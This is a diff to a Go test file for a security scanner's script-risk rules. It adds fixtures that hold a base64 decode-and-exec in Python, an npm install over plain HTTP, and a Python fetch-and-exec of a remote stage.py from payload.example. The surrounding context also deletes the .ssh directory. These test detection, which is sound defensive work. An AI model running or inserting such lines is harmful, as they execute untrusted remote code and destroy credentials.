@@ -305,6 +305,30 @@ fs.rmSync('.ssh', { recursive: true, force: true });`,
 }
 `,
 		},
+		{
+			name:     "script-risk decoded Python payload through public API",
+			filename: "scripts/bootstrap.py",
+			ruleID:   "PY_DECODE_EXEC_001",
+			content: `import base64
+payload = base64.b64decode(blob)
+exec(payload)
+`,
+		},
+		{
+			name:     "script-risk unsafe npm source through public API",
+			filename: "scripts/bootstrap.sh",
+			ruleID:   "SHELL_UNSAFE_NPM_SOURCE_001",
+			content:  `npm install http://packages.example/helper.tgz`,
+		},
+		{
+			name:     "script-risk remote Python exec through public API",
+			filename: "scripts/bootstrap.py",
+			ruleID:   "PY_REMOTE_FETCH_EXEC_001",
+			content: `import requests
+payload = requests.get("https://payload.example/stage.py").text
+exec(payload)
+`,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -412,6 +436,7 @@ func TestListRulesIncludesAnalyzerRules(t *testing.T) {
 		"TOXIC_001":              "toxicflow",
 		"NLP_HIDDEN_INSTRUCTION": "nlp",
 		"RUGPULL_001":            "rugpull",
+		"PY_DECODE_EXEC_001":     "script-risk",
 	}
 	for id, analyzer := range want {
 		got, ok := ids[id]
